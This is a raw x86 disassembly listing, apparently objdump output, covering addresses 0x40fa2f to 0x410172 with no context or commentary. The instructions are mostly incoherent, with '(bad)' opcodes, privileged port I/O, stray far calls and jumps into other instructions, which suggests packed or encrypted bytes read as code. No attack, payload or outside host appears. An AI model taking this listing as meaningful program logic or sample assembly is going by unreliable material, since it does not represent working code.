  40fa2f:	sar    DWORD PTR [eax],0x1f
  40fa32:	cmp    bl,BYTE PTR [edx+0x650f663c]
  40fa38:	adc    ah,bl
  40fa3a:	outs   dx,DWORD PTR cs:[esi]
  40fa3c:	mov    ch,0xa2
  40fa3e:	test   al,0xdf
  40fa40:	ror    DWORD PTR [eax-0x43],1
  40fa43:	inc    ebp
  40fa44:	ins    BYTE PTR es:[edi],dx
  40fa45:	sub    ebx,esp
  40fa47:	out    dx,eax
  40fa48:	inc    edi
  40fa49:	add    bl,BYTE PTR [edx]
  40fa4b:	mov    ebx,0xd1a6fc62
  40fa50:	mov    al,ds:0x87d6acd9
  40fa55:	in     al,dx
  40fa56:	inc    ecx
  40fa57:	lods   al,BYTE PTR ds:[esi]
  40fa58:	and    ah,ah
  40fa5a:	jbe    0x40fa31
  40fa5c:	cli    
  40fa5d:	sahf   
  40fa5e:	and    bh,BYTE PTR [edx-0x227a7621]
  40fa64:	ins    BYTE PTR es:[edi],dx
  40fa65:	clc    
  40fa66:	mov    dl,BYTE PTR [edi-0x4e]
  40fa69:	cli    
  40fa6a:	mov    eax,edx
  40fa6c:	jl     0x40fadc
  40fa6e:	loopne 0x40f9fb
  40fa70:	inc    bx
  40fa72:	pop    esi
  40fa73:	popf   
  40fa74:	jbe    0x40fa72
  40fa76:	cmp    eax,0x679cad1b
  40fa7b:	inc    esi
  40fa7c:	cmp    eax,0xb2c89fae
  40fa81:	mov    edi,0x12b65620
  40fa86:	je     0x40fa31
  40fa88:	inc    edx
  40fa89:	arpl   WORD PTR [edi-0x71fb623b],bx
  40fa8f:	(bad)  
  40fa90:	adc    BYTE PTR [esi],dl
  40fa92:	add    eax,0x4071c1ae
  40fa97:	lds    ecx,FWORD PTR [ebx-0x24]
  40fa9a:	xchg   edi,eax
  40fa9b:	dec    esi
  40fa9c:	outs   dx,DWORD PTR ds:[esi]
  40fa9d:	pop    edi
  40fa9e:	jl     0x40faa1
  40faa0:	shl    DWORD PTR [esi],cl
  40faa2:	std    
  40faa3:	pop    es
  40faa4:	lds    esp,FWORD PTR [ebx+0x1b]
  40faa7:	scas   eax,DWORD PTR es:[edi]
  40faa8:	rol    ch,1
  40faaa:	arpl   WORD PTR [ebp-0x763babf8],bx
  40fab0:	pushaw 
  40fab2:	in     eax,dx
  40fab3:	jp     0x40fb0f
  40fab5:	mov    ch,BYTE PTR [eax-0x3b]
  40fab8:	sbb    eax,0x1da5fb51
  40fabd:	mov    ecx,edi
  40fabf:	inc    edx
  40fac0:	in     al,dx
  40fac1:	dec    ebx
  40fac2:	pop    ss
  40fac3:	cmp    DWORD PTR [eax+0xe],eax
  40fac6:	inc    edi
  40fac7:	mov    al,BYTE PTR [edi]
  40fac9:	jge    0x40fb35
  40facb:	int    0x3b
  40facd:	mov    ch,0xba
  40facf:	and    cl,BYTE PTR [ecx-0x50d7f2f7]
  40fad5:	rol    DWORD PTR [esi+eiz*2-0x10],0xf9
  40fada:	push   ecx
  40fadb:	add    BYTE PTR [esi+0x741bc7ca],cl
  40fae1:	shr    DWORD PTR [ecx],0x59
  40fae4:	jl     0x40fa68
  40fae6:	in     eax,dx
  40fae7:	call   0x3d6:0xb26cd390
  40faee:	scas   eax,DWORD PTR es:[edi]
  40faef:	sub    DWORD PTR [ecx+0x2],ecx
  40faf2:	bound  ecx,QWORD PTR [ebx-0x31]
  40faf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf6:	andps  xmm4,XMMWORD PTR gs:[ecx]
  40fafa:	add    al,0x81
  40fafc:	cmc    
  40fafd:	aam    0xd1
  40faff:	sbb    eax,DWORD PTR [ecx-0x67]
  40fb02:	das    
  40fb03:	test   al,0x1f
  40fb05:	adc    al,0x3e
  40fb07:	push   edi
  40fb08:	pop    ecx
  40fb09:	pop    ebp
  40fb0a:	sbb    ebx,DWORD PTR [esi-0x1d6a7e60]
  40fb10:	(bad)  
  40fb12:	(bad)  
  40fb13:	fcom   DWORD PTR [edi]
  40fb15:	push   0x11673a76
  40fb1a:	retf   
  40fb1b:	jo     0x40fae6
  40fb1d:	pop    esi
  40fb1e:	mov    al,0xa1
  40fb20:	outs   dx,BYTE PTR ds:[esi]
  40fb21:	dec    eax
  40fb22:	jmp    0x40fb2a
  40fb24:	enter  0xb478,0xce
  40fb28:	ins    BYTE PTR es:[edi],dx
  40fb29:	adc    eax,0xd4c8da8d
  40fb2e:	push   esi
  40fb2f:	mov    al,ds:0xa7d14841
  40fb34:	mov    ecx,0xe7bcdb9e
  40fb39:	mov    ds:0x67dfb6b3,al
  40fb3e:	call   0x5ac3:0xf5f07127
  40fb45:	fdivr  DWORD PTR [edi-0x24e4567d]
  40fb4b:	(bad)  
  40fb4c:	int    0x1c
  40fb4e:	mov    edi,0x4aada5ac
  40fb53:	fsubr  QWORD PTR ds:0x13e0cdc7
  40fb59:	enter  0xdff4,0x5c
  40fb5d:	adc    cl,BYTE PTR [esi-0x100f8896]
  40fb63:	push   edi
  40fb64:	out    0x28,eax
  40fb66:	push   0x34
  40fb68:	pusha  
  40fb69:	inc    eax
  40fb6a:	inc    edx
  40fb6b:	imul   ebp,ebp,0xb98e13fe
  40fb71:	daa    
  40fb72:	push   es
  40fb73:	adc    ebx,DWORD PTR [eax]
  40fb75:	cmp    ah,BYTE PTR [edx]
  40fb77:	ror    DWORD PTR [edx+0x582d0b86],1
  40fb7d:	xchg   edx,eax
  40fb7e:	add    DWORD PTR [eax+0x5a45a5d3],eax
  40fb84:	mov    ecx,0x9ff00e3
  40fb89:	push   cs
  40fb8a:	lock out 0x53,al
  40fb8d:	es repz jl 0x40fb64
  40fb91:	lods   al,BYTE PTR ds:[esi]
  40fb92:	sbb    DWORD PTR [edi],0xffffffb7
  40fb95:	loop   0x40fbaa
  40fb97:	sbb    ah,BYTE PTR [ecx+0x3a]
  40fb9a:	adc    al,0xdc
  40fb9c:	mov    edx,0xb2761090
  40fba1:	es mov edi,eax
  40fba4:	dec    esi
  40fba5:	mov    dh,0x4d
  40fba7:	lods   al,BYTE PTR ds:[esi]
  40fba8:	jae    0x40fc26
  40fbaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbab:	pop    ebx
  40fbac:	outs   dx,DWORD PTR ds:[esi]
  40fbad:	xchg   BYTE PTR [edx-0x39b9bc01],ch
  40fbb3:	into   
  40fbb4:	pop    esp
  40fbb5:	or     esi,DWORD PTR [edi-0x1b]
  40fbb8:	jne    0x40fbfa
  40fbba:	addr16 xchg edx,eax
  40fbbc:	mov    bl,BYTE PTR [edi]
  40fbbe:	cwde   
  40fbbf:	jp     0x40fb50
  40fbc1:	fsub   QWORD PTR [edi+0x4ec55c1f]
  40fbc7:	pop    eax
  40fbc8:	jo     0x40fc19
  40fbca:	adc    BYTE PTR [esi+0x28],dl
  40fbcd:	sub    DWORD PTR [ebp-0x47],ebx
  40fbd0:	hlt    
  40fbd1:	inc    eax
  40fbd2:	push   0x7739d11c
  40fbd7:	cmp    al,0xda
  40fbd9:	out    0x56,al
  40fbdb:	pop    ss
  40fbdc:	dec    esp
  40fbdd:	popa   
  40fbde:	push   cs
  40fbdf:	in     al,dx
  40fbe0:	inc    esp
  40fbe1:	sub    ebx,DWORD PTR [ecx-0x31ceef26]
  40fbe7:	popf   
  40fbe8:	lods   eax,DWORD PTR ds:[esi]
  40fbe9:	iret   
  40fbea:	call   0xceb9642e
  40fbef:	test   BYTE PTR [eax+0x2b],bl
  40fbf2:	pop    es
  40fbf3:	cmp    DWORD PTR [edi+0x16],eax
  40fbf6:	out    dx,al
  40fbf7:	mov    es,WORD PTR [esi+0x41768e83]
  40fbfd:	mov    al,bl
  40fbff:	ins    DWORD PTR es:[edi],dx
  40fc00:	popf   
  40fc01:	bnd jp 0x40fc1e
  40fc04:	out    dx,eax
  40fc05:	dec    ecx
  40fc06:	das    
  40fc07:	jmp    0x40fbd3
  40fc09:	test   eax,0x3d7d8cff
  40fc0e:	push   edx
  40fc0f:	in     al,dx
  40fc10:	xchg   dh,ah
  40fc12:	jns    0x40fc7b
  40fc14:	jmp    0xe27dbbbf
  40fc19:	xchg   ecx,eax
  40fc1a:	clc    
  40fc1b:	int    0xec
  40fc1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc1e:	dec    edx
  40fc1f:	cmp    ebx,esp
  40fc21:	fcom   st(2)
  40fc23:	leave  
  40fc24:	pop    edx
  40fc25:	in     al,0xbe
  40fc27:	cwde   
  40fc28:	sbb    DWORD PTR [ebp-0x6cec17a],eax
  40fc2e:	mov    esi,eax
  40fc30:	xor    BYTE PTR [ecx+eax*1],dh
  40fc33:	mov    cl,0x8c
  40fc35:	aad    0x95
  40fc37:	iret   
  40fc38:	mov    ds:0x78c338fb,al
  40fc3d:	jmp    0x40fc9f
  40fc3f:	inc    eax
  40fc40:	jg     0x40fc30
  40fc42:	test   al,0x3f
  40fc44:	pop    ecx
  40fc45:	shr    dh,cl
  40fc47:	jecxz  0x40fcae
  40fc49:	sti    
  40fc4a:	jg     0x40fc99
  40fc4c:	cmp    DWORD PTR [eax+0xaaa2ec3],0xffffffa0
  40fc53:	int3   
  40fc54:	xchg   bl,cl
  40fc56:	lock xchg esp,eax
  40fc58:	xchg   esp,eax
  40fc59:	(bad)
  40fc5d:	and    DWORD PTR [ecx],ecx
  40fc5f:	mov    ?,edx
  40fc61:	add    eax,0x4ec9b76d
  40fc66:	clc    
  40fc67:	icebp  
  40fc68:	jne    0x40fbf9
  40fc6a:	ror    BYTE PTR [eax],1
  40fc6c:	lods   eax,DWORD PTR ds:[esi]
  40fc6d:	push   edi
  40fc6e:	push   0x8a977c3c
  40fc73:	xchg   ebp,eax
  40fc74:	outs   dx,DWORD PTR ds:[esi]
  40fc75:	push   ss
  40fc76:	or     al,0x73
  40fc78:	push   esp
  40fc79:	aam    0x49
  40fc7b:	push   ss
  40fc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc7d:	push   eax
  40fc7e:	mov    bl,0x77
  40fc80:	and    BYTE PTR [edi+0x7c9c3863],ah
  40fc86:	jg     0x40fc4c
  40fc88:	cli    
  40fc89:	mov    ah,0x6a
  40fc8b:	out    0xe8,al
  40fc8d:	and    al,0xaf
  40fc8f:	mov    ds:0x8fd8894a,eax
  40fc94:	sub    DWORD PTR es:[edx-0x65],edi
  40fc98:	mov    ebp,0xa776d62
  40fc9d:	repnz addr16 out dx,al
  40fca0:	rcl    BYTE PTR [edi+ebx*1-0x329ff5c2],1
  40fca7:	xor    ch,bl
  40fca9:	xchg   ebp,eax
  40fcaa:	and    dh,BYTE PTR [esi+0x65799e75]
  40fcb0:	in     eax,dx
  40fcb1:	scas   al,BYTE PTR es:[edi]
  40fcb2:	adc    esi,DWORD PTR [esi-0x1e254a3f]
  40fcb8:	mov    BYTE PTR [edi+edi*1],bh
  40fcbb:	or     al,0x96
  40fcbd:	retf   
  40fcbe:	or     BYTE PTR [edi-0x6a95af15],0x98
  40fcc5:	ins    BYTE PTR es:[edi],dx
  40fcc6:	mov    esp,0x621e223c
  40fccb:	jp     0x40fcf7
  40fccd:	jno    0x40fcfe
  40fccf:	loope  0x40fc68
  40fcd1:	stos   DWORD PTR es:[edi],eax
  40fcd2:	call   0x480e:0xbd67fb43
  40fcd9:	xor    DWORD PTR ds:0x8a069763,edx
  40fcdf:	pusha  
  40fce0:	fist   DWORD PTR [edx+ebp*4-0x701a107b]
  40fce7:	dec    edx
  40fce8:	inc    edx
  40fce9:	arpl   WORD PTR [ecx],di
  40fceb:	ins    BYTE PTR es:[edi],dx
  40fcec:	outs   dx,BYTE PTR ds:[esi]
  40fced:	inc    eax
  40fcee:	jnp    0x40fcd5
  40fcf0:	xor    DWORD PTR [eax],ebx
  40fcf2:	sbb    bl,al
  40fcf4:	clc    
  40fcf5:	jbe    0x40fd6e
  40fcf7:	mov    eax,ds:0xf13f39e8
  40fcfc:	fsubr  st(3),st
  40fcfe:	xchg   edi,eax
  40fcff:	pop    es
  40fd00:	and    DWORD PTR [edx],ebx
  40fd02:	cmc    
  40fd03:	push   ss
  40fd04:	cs mov edx,0xf858d740
  40fd0a:	or     edx,DWORD PTR [edi]
  40fd0c:	jecxz  0x40fd4b
  40fd0e:	xchg   DWORD PTR [ebx+0x6d],ecx
  40fd11:	mov    ebp,0xbd05ec3c
  40fd16:	and    al,0xff
  40fd18:	imul   ebx,ecx,0xfffffff2
  40fd1b:	mov    ch,0xb5
  40fd1d:	inc    edx
  40fd1e:	mov    ecx,DWORD PTR [ebp-0x57]
  40fd21:	aam    0xd2
  40fd23:	out    0xce,eax
  40fd25:	or     al,0xdd
  40fd27:	pusha  
  40fd28:	sbb    eax,0xa2f2955e
  40fd2d:	jae    0x40fd0d
  40fd2f:	retf   
  40fd30:	sbb    eax,DWORD PTR [edx+0x74]
  40fd33:	lods   al,BYTE PTR ds:[esi]
  40fd34:	aas    
  40fd35:	push   0xa7b81de2
  40fd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd3b:	push   ebp
  40fd3c:	add    dh,BYTE PTR [esi]
  40fd3e:	mov    bh,0xdd
  40fd40:	push   eax
  40fd41:	mov    ah,BYTE PTR [edi-0x19b0e6dc]
  40fd47:	push   cs
  40fd48:	jge    0x40fd91
  40fd4a:	retf   0xa974
  40fd4d:	and    ecx,DWORD PTR [ecx+0x7b112166]
  40fd53:	stc    
  40fd54:	push   edx
  40fd55:	dec    eax
  40fd56:	jnp    0x40fdd0
  40fd58:	or     eax,0x9dc6a9b
  40fd5d:	xchg   edx,eax
  40fd5e:	jbe    0x40fd63
  40fd60:	pop    ebx
  40fd61:	push   esi
  40fd62:	mov    ah,0xdc
  40fd64:	sub    al,0x7e
  40fd66:	mov    dh,0x5b
  40fd68:	xchg   ecx,eax
  40fd69:	sub    DWORD PTR [edi],edi
  40fd6b:	rol    cl,1
  40fd6d:	xchg   DWORD PTR ss:[ebx],esp
  40fd70:	clc    
  40fd71:	cmp    ch,BYTE PTR [eax]
  40fd73:	outs   dx,BYTE PTR ds:[esi]
  40fd74:	xlat   BYTE PTR ds:[ebx]
  40fd75:	push   0x42
  40fd77:	clc    
  40fd78:	cmp    DWORD PTR ds:0xd38706ce,esi
  40fd7e:	mov    ebx,0xccf54819
  40fd83:	or     dh,BYTE PTR [ecx+0x57e1e1ea]
  40fd89:	js     0x40fd5c
  40fd8b:	neg    BYTE PTR [eax+0x1dfe3de4]
  40fd91:	fstp   DWORD PTR [edi-0x1ddec9b0]
  40fd97:	aaa    
  40fd98:	fimul  WORD PTR [edx-0x1b9655a8]
  40fd9e:	jnp    0x40fd9d
  40fda0:	mov    eax,0x7f679e54
  40fda5:	cmp    ebp,DWORD PTR [ebx+0x33]
  40fda8:	and    bh,BYTE PTR ds:0x832c086
  40fdae:	mov    esi,DWORD PTR [edx-0x62eba8bb]
  40fdb4:	loop   0x40fd8f
  40fdb6:	ficom  DWORD PTR [ebp-0x2d054add]
  40fdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdbd:	bound  eax,QWORD PTR [eax-0x33]
  40fdc0:	not    DWORD PTR [edi+edx*1-0x16fbb4e8]
  40fdc7:	push   0x55
  40fdc9:	aas    
  40fdca:	push   0xfffffff5
  40fdcc:	cmp    BYTE PTR [edx],al
  40fdce:	xchg   esp,eax
  40fdcf:	sbb    BYTE PTR [edx+eiz*4+0x104114df],bh
  40fdd6:	cmc    
  40fdd7:	inc    esi
  40fdd8:	(bad)  
  40fdd9:	(bad)  
  40fdda:	pop    es
  40fddb:	addr16 inc edi
  40fddd:	lds    ebx,FWORD PTR [ebx]
  40fddf:	xchg   ebp,eax
  40fde0:	pop    ss
  40fde1:	sub    esp,DWORD PTR [esi-0xa]
  40fde4:	push   ss
  40fde5:	mov    edi,0x1c2e5194
  40fdea:	rcl    DWORD PTR [ebp-0x79529749],1
  40fdf0:	xchg   ebp,eax
  40fdf1:	inc    eax
  40fdf2:	xchg   DWORD PTR [esi],ebp
  40fdf4:	add    edx,ecx
  40fdf6:	push   ebx
  40fdf7:	sub    eax,0xbc04d5d9
  40fdfc:	in     eax,0x68
  40fdfe:	mov    DWORD PTR [ebx],ebx
  40fe00:	ss cmp eax,0xa02e9e7
  40fe06:	cwde   
  40fe07:	and    eax,0x4c0e587
  40fe0c:	das    
  40fe0d:	fistp  DWORD PTR [eax+0x3c]
  40fe10:	xchg   ecx,eax
  40fe11:	pop    edx
  40fe12:	icebp  
  40fe13:	xchg   ebx,eax
  40fe14:	stos   DWORD PTR es:[edi],eax
  40fe15:	fndisi(8087 only) 
  40fe17:	out    dx,al
  40fe18:	push   es
  40fe19:	mov    ebp,0x31cc86be
  40fe1e:	bound  esp,QWORD PTR [eax]
  40fe20:	(bad)  
  40fe21:	sub    DWORD PTR [edx+0x3fce6ad7],edi
  40fe27:	jb     0x40fe83
  40fe29:	test   eax,0xf8a8846d
  40fe2e:	arpl   WORD PTR [ebp+0x4dc3286b],bx
  40fe34:	aaa    
  40fe35:	sub    ch,BYTE PTR [ebx+ebp*1-0x2c]
  40fe39:	shl    BYTE PTR [ecx],1
  40fe3b:	mov    edi,DWORD PTR [ecx+0x6da0824d]
  40fe41:	pop    ds
  40fe42:	imul   esp,DWORD PTR [ebp+0xedffdb4],0xffffffcc
  40fe49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe4a:	add    eax,0x80767fb3
  40fe4f:	je     0x40fdec
  40fe51:	dec    edx
  40fe52:	sbb    ebp,esi
  40fe54:	inc    edi
  40fe55:	cli    
  40fe56:	mov    WORD PTR [ebx-0x43],ds
  40fe59:	(bad)  
  40fe5a:	dec    edx
  40fe5b:	add    edi,eax
  40fe5d:	daa    
  40fe5e:	loope  0x40fde1
  40fe60:	mov    ebp,0xbf1af3d5
  40fe65:	ror    bl,cl
  40fe67:	mov    al,0x73
  40fe69:	lds    edx,FWORD PTR [ebp-0x7f]
  40fe6c:	push   esp
  40fe6d:	mov    bh,0x6
  40fe6f:	cs cmp eax,0x96c4615f
  40fe75:	cwde   
  40fe76:	mov    es,edi
  40fe78:	fldcw  WORD PTR [edi]
  40fe7a:	call   0xf155468a
  40fe7f:	jno    0x40fe6a
  40fe81:	mov    ah,0x70
  40fe83:	fist   DWORD PTR [eax-0x3f0ba483]
  40fe89:	es jo  0x40fef3
  40fe8c:	xchg   edx,eax
  40fe8d:	out    0x13,al
  40fe8f:	ins    DWORD PTR es:[edi],dx
  40fe90:	loopne 0x40fee6
  40fe92:	mov    edx,DWORD PTR [eax+0x7a303abf]
  40fe98:	es xor dl,bl
  40fe9b:	mov    BYTE PTR ds:0x7450b6e4,bl
  40fea1:	push   cs
  40fea2:	inc    ecx
  40fea3:	(bad)  
  40fea4:	iret   
  40fea5:	fisub  DWORD PTR [ebx*1+0x1cdbf79d]
  40feac:	or     dl,BYTE PTR [edi]
  40feae:	inc    ecx
  40feaf:	jns    0x40ff20
  40feb1:	jecxz  0x40fef8
  40feb3:	shr    bl,1
  40feb5:	jnp    0x40ff02
  40feb7:	and    al,0xe0
  40feb9:	imul   ebx,edi,0x4e
  40febc:	dec    ebp
  40febd:	or     eax,0xb161f728
  40fec2:	mov    ds:0x6c49a969,al
  40fec7:	loopne 0x40feee
  40fec9:	sub    DWORD PTR [eax-0x1e],edi
  40fecc:	cdq    
  40fecd:	or     eax,0x8a422af1
  40fed2:	mov    WORD PTR ds:0xd6098891,cs
  40fed8:	inc    ebx
  40fed9:	loop   0x40ff34
  40fedb:	(bad)  
  40fedc:	pop    ss
  40fedd:	xor    esi,DWORD PTR fs:[ebp+0x64]
  40fee1:	icebp  
  40fee2:	call   0xbe1d:0x7b6bf0dd
  40fee9:	mov    eax,DWORD PTR [eax-0x71]
  40feec:	inc    ecx
  40feed:	ret    
  40feee:	or     edx,DWORD PTR [esi-0x4a]
  40fef1:	lds    eax,FWORD PTR [esi-0x46]
  40fef4:	jle    0x40fe85
  40fef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef7:	xchg   cl,bh
  40fef9:	mov    dh,0x62
  40fefb:	retf   
  40fefc:	push   edi
  40fefd:	pop    eax
  40fefe:	mov    ebx,ecx
  40ff00:	xchg   esi,eax
  40ff01:	bnd jb 0x40fef4
  40ff04:	add    eax,0x8b8169c7
  40ff09:	rcr    DWORD PTR ss:[esi],1
  40ff0c:	add    edx,DWORD PTR [esi+edi*4-0x13fb0c33]
  40ff13:	mov    ds:0xec0687a7,al
  40ff18:	data16 jecxz 0x40fec2
  40ff1b:	jns    0x40fec8
  40ff1d:	out    0x2f,al
  40ff1f:	mov    dl,0x60
  40ff21:	dec    ebp
  40ff22:	lahf   
  40ff23:	jg     0x40fef1
  40ff25:	sbb    al,0xf
  40ff27:	dec    esp
  40ff28:	repnz sbb edx,DWORD PTR [ecx+0x8]
  40ff2c:	and    bl,bl
  40ff2e:	scas   al,BYTE PTR es:[edi]
  40ff2f:	jne    0x40ff70
  40ff31:	push   esp
  40ff32:	std    
  40ff33:	mov    WORD PTR [eax-0x5e1b7928],cs
  40ff39:	popa   
  40ff3a:	push   ebx
  40ff3b:	fsub   QWORD PTR [ecx]
  40ff3d:	jmp    FWORD PTR [esi+0x8]
  40ff40:	mov    esi,0x2925d79a
  40ff45:	dec    ecx
  40ff46:	lahf   
  40ff47:	ins    BYTE PTR es:[edi],dx
  40ff48:	or     DWORD PTR [ebp+0x61],esi
  40ff4b:	shr    BYTE PTR [eax+0x69c0458b],0x96
  40ff52:	xor    eax,0xed4ad063
  40ff57:	fcomp  QWORD PTR [ebx-0x1121b7e4]
  40ff5d:	rcr    DWORD PTR [edi-0x37],cl
  40ff60:	div    BYTE PTR [esi+0x6ba6cff]
  40ff66:	rcl    BYTE PTR [esi],0xc5
  40ff69:	sbb    eax,0x9ef5ec3a
  40ff6e:	xor    al,0x4
  40ff70:	cdq    
  40ff71:	pop    esp
  40ff72:	ja     0x40ff47
  40ff74:	ret    0xaca3
  40ff77:	add    BYTE PTR [edi],al
  40ff79:	push   ecx
  40ff7a:	jne    0x40ff91
  40ff7c:	adc    DWORD PTR [edi],eax
  40ff7e:	popf   
  40ff7f:	sub    DWORD PTR [edx],edx
  40ff81:	inc    eax
  40ff82:	xchg   esi,eax
  40ff83:	xchg   ebx,eax
  40ff84:	sub    DWORD PTR [ebx],esp
  40ff86:	es xchg ebp,eax
  40ff88:	bound  ecx,QWORD PTR [ebx+0x3a3f9198]
  40ff8e:	stos   BYTE PTR es:[edi],al
  40ff8f:	sbb    BYTE PTR [ebp-0x37f01383],dh
  40ff95:	scas   eax,DWORD PTR es:[edi]
  40ff96:	adc    eax,0xda86c861
  40ff9b:	loop   0x40ff82
  40ff9d:	xor    bl,BYTE PTR [ebx-0xc4e39d8]
  40ffa3:	cmp    eax,0xa2f44df2
  40ffa8:	mov    bl,0x53
  40ffaa:	pop    esi
  40ffab:	into   
  40ffac:	(bad)  
  40ffad:	cmp    DWORD PTR es:[esi],eax
  40ffb0:	jns    0x40ffab
  40ffb2:	cmp    al,0x2f
  40ffb4:	sahf   
  40ffb5:	push   ss
  40ffb6:	retf   
  40ffb7:	push   0xffffff83
  40ffb9:	add    al,0x30
  40ffbb:	add    edx,ecx
  40ffbd:	inc    edx
  40ffbe:	ins    DWORD PTR es:[edi],dx
  40ffbf:	mov    ecx,0x8d470ff5
  40ffc4:	jl     0x40fff0
  40ffc6:	ja     0x40ffb9
  40ffc8:	fisttp QWORD PTR [eax+0x57]
  40ffcb:	push   eax
  40ffcc:	and    DWORD PTR ds:[edx-0x39],ebp
  40ffd0:	xchg   ebx,eax
  40ffd1:	push   esi
  40ffd2:	fst    st(5)
  40ffd4:	add    BYTE PTR [eax+edx*2-0xc],ch
  40ffd8:	xchg   ebp,eax
  40ffd9:	jo     0x40ff9f
  40ffdb:	cmp    DWORD PTR [edx],0x8e928f51
  40ffe1:	das    
  40ffe2:	xchg   edx,eax
  40ffe3:	xlat   BYTE PTR gs:[ebx]
  40ffe5:	sahf   
  40ffe6:	loopne 0x40ffd8
  40ffe8:	out    0x42,eax
  40ffea:	sbb    DWORD PTR [esi+0x54],eax
  40ffed:	mov    ds:0xb852e6e5,al
  40fff2:	sub    BYTE PTR [edx-0x334d1d17],0xb
  40fff9:	scas   eax,DWORD PTR es:[edi]
  40fffa:	fwait
  40fffb:	and    BYTE PTR [ebp-0x63],0xcc
  40ffff:	adc    DWORD PTR [ecx-0x5c],edi
  410002:	xchg   cl,al
  410004:	je     0x41001e
  410006:	dec    edx
  410007:	(bad)  
  410008:	jg     0x40fff4
  41000a:	test   DWORD PTR [ecx-0x22],0xeb0dae27
  410011:	fcom   DWORD PTR [eax+0x2]
  410014:	(bad)  
  410015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410016:	fmul   st,st(7)
  410018:	sbb    DWORD PTR [ebp+0x7b1d8db5],ebp
  41001e:	int    0x38
  410020:	sub    al,0x3
  410022:	jne    0x41005b
  410024:	out    0xbb,eax
  410026:	mov    al,0xd1
  410028:	mov    cl,0x0
  41002a:	jg     0x410003
  41002c:	pop    ecx
  41002d:	adc    al,0x20
  41002f:	sbb    BYTE PTR [eax+ecx*8],0xc
  410033:	sar    ecx,cl
  410035:	jl     0x410072
  410037:	fdivp  st(4),st
  410039:	pop    ecx
  41003a:	daa    
  41003b:	packssdw mm6,QWORD PTR [ebx-0x1b]
  41003f:	jle    0x410080
  410041:	loope  0x41009a
  410043:	push   edi
  410044:	aas    
  410045:	jnp    0x41009f
  410047:	out    0xe4,eax
  410049:	sub    esi,edx
  41004b:	cmp    eax,0x334153e8
  410050:	lahf   
  410051:	repnz addr16 leave 
  410054:	das    
  410055:	mov    dl,0xad
  410057:	dec    ebp
  410058:	sub    DWORD PTR ds:0x3eee6147,eax
  41005e:	inc    esp
  41005f:	not    DWORD PTR [eax*4-0x65c360fe]
  410066:	mov    gs:0x45938329,eax
  41006c:	jnp    0x410021
  41006e:	sub    al,0x15
  410070:	dec    DWORD PTR [edx+0x4fbb42a2]
  410076:	dec    esi
  410077:	jmp    0xd1385aa4
  41007c:	fdivr  st(1),st
  41007e:	fnstenv [ebp+0x7f495b97]
  410084:	mov    cl,0x3c
  410086:	sbb    BYTE PTR [eax-0x65fa193],al
  41008c:	push   ebx
  41008d:	loopne 0x41008d
  41008f:	mov    ecx,0x7d8c0dd3
  410094:	fidiv  WORD PTR [ebx+0x2e9f5da2]
  41009a:	or     DWORD PTR [ebx+0x2b],0x69
  41009e:	pop    ss
  41009f:	xchg   edx,eax
  4100a0:	inc    ebp
  4100a1:	push   cs
  4100a2:	addr16 dec esp
  4100a4:	sahf   
  4100a5:	xor    BYTE PTR [ebx+0x6bfd16c1],ah
  4100ab:	mov    cl,0x7f
  4100ad:	outs   dx,BYTE PTR ds:[esi]
  4100ae:	xchg   DWORD PTR [eax*4+0x40ca21ac],eax
  4100b5:	int    0xfa
  4100b7:	and    eax,0x470dd82
  4100bc:	lock xchg edx,eax
  4100be:	scas   eax,DWORD PTR es:[edi]
  4100bf:	push   edi
  4100c0:	mov    bh,dl
  4100c2:	(bad)  
  4100c3:	stc    
  4100c4:	and    eax,0x4423e76e
  4100c9:	push   eax
  4100ca:	cs pop ebp
  4100cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100cd:	or     BYTE PTR [ebp+0x61392bab],0x7e
  4100d4:	loop   0x4100ba
  4100d6:	push   0x4
  4100d8:	int3   
  4100d9:	pop    ebx
  4100da:	scas   eax,DWORD PTR es:[edi]
  4100db:	loop   0x4100c7
  4100dd:	aas    
  4100de:	sahf   
  4100df:	or     DWORD PTR [edi+eax*2+0x6a],ebx
  4100e3:	les    ecx,FWORD PTR [ebp+0x66d28927]
  4100e9:	test   eax,0x99efa090
  4100ee:	stc    
  4100ef:	cmp    al,0x99
  4100f1:	jns    0x41015b
  4100f3:	mov    ecx,0x517453e4
  4100f8:	xchg   DWORD PTR [edi+0x4d528f1b],edx
  4100fe:	pop    ecx
  4100ff:	dec    esi
  410100:	imul   ebp,DWORD PTR [eax+0x69],0x2
  410104:	mov    cl,0xe9
  410106:	(bad)  [ebp-0x35]
  410109:	xchg   ecx,eax
  41010a:	pop    ss
  41010b:	pop    edx
  41010c:	pusha  
  41010d:	lock push es
  41010f:	out    0x6c,al
  410111:	mov    ebx,0xf5bf07c9
  410116:	pusha  
  410117:	jno    0x4100ff
  410119:	xchg   DWORD PTR [edx+0x7c329f73],ebx
  41011f:	or     BYTE PTR [esi+0x5aed8139],bh
  410125:	add    bh,bl
  410127:	sbb    eax,0x4600ffaa
  41012c:	imul   ebp,DWORD PTR [edi+0x37],0x77
  410130:	mov    es,WORD PTR [ebp-0x3070cec7]
  410136:	test   BYTE PTR fs:[eax],cl
  410139:	fsub   QWORD PTR [edi+edi*8-0x4b]
  41013d:	cmc    
  41013e:	popf   
  41013f:	les    edi,FWORD PTR [ebx+ebx*8+0x3919e473]
  410146:	xchg   ebx,eax
  410147:	or     dl,BYTE PTR [ecx]
  410149:	repz int 0xee
  41014c:	jae    0x41019b
  41014e:	and    al,BYTE PTR [ebx+0x4c]
  410151:	loope  0x4101c7
  410153:	rcr    BYTE PTR [edx],0x84
  410156:	pusha  
  410157:	sbb    al,0xdc
  410159:	mov    edi,0x6957b5cd
  41015e:	xchg   esp,eax
  41015f:	imul   esi,DWORD PTR [ecx-0x63],0xffffffaa
  410163:	dec    edi
  410164:	cli    
  410165:	pop    esi
  410166:	in     al,0xf2
  410168:	mov    ch,dh
  41016a:	push   es
  41016b:	mov    gs,WORD PTR [ecx-0x7f]
  41016e:	in     eax,dx
  41016f:	dec    eax
  410170:	out    0x4c,al
  410172:	gs jecxz 0x41013f
